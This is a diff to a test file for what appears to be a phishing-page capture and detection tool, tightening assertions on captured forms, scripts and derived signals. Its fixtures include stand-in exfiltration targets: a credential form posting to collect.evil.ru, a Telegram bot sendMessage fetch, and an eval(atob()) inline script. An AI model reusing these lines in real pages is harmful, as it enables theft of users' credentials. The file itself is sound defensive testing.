@@ -81,7 +81,7 @@ async def test_capture_collects_dom_scripts_network_and_injects_instrumentation(
     )
     data = await cap.capture()
     assert "__phishLog" in seen[0]
-    assert data["forms"][0]["action"].startswith("https://collect.evil.ru")
+    assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"
     assert {s["src"] for s in data["scripts"]} == {None, "https://cdn.evil.ru/k.js"}
     assert data["requests"][0]["resource_type"] == "script"
     assert "credential_form_off_domain" in {s["name"] for s in data["derived_signals"]}
@@ -138,7 +138,7 @@ async def test_sanitized_view_keeps_structure_and_strips_script_literals():
     body = view.split("<<<UNTRUSTED_PAGE_CONTENT>>>\n", 1)[1].split("\n<<<END_", 1)[0]
     data = json.loads(body.split("\n", 1)[1])
     assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"
-    assert data["sinks"][0]["url"].startswith("https://api.telegram.org")
+    assert data["sinks"][0]["url"] == "https://api.telegram.org/bot1/sendMessage"
     inline = next(s for s in data["scripts"] if s["src"] is None)
     assert inline["text"] == "eval(atob(''))"
 
@@ -425,7 +425,7 @@ async def test_raw_html_fallback_when_the_browser_cannot_load_the_page(short_bud
         }
     ]
     assert static["script_srcs"] == ["https://cdn.kit.example/k.js"]
-    assert "api.telegram.org" in static["inline_scripts"][0]
+    assert static["inline_scripts"][0] == "fetch('https://api.telegram.org/bot1/sendMessage')"
     assert static["external_hosts"] == ["cdn.kit.example", "collect.evil.ru"]
     names = {s["name"] for s in static["derived_signals"]}
     assert {"credential_form_off_domain", "telegram_bot_exfil"} <= names
@@ -768,5 +768,5 @@ async def test_a_failed_capture_json_upload_keeps_a_live_capture():
     data = await cap.capture()
     # capture.json is an artifact, not the result: the capture stands without it.
     assert "error" not in data and cap.failure is None and cap.artifacts == []
-    assert data["forms"][0]["action"].startswith("https://collect.evil.ru")
+    assert data["forms"][0]["action"] == "https://collect.evil.ru/p.php"
     assert on_loop == [False]
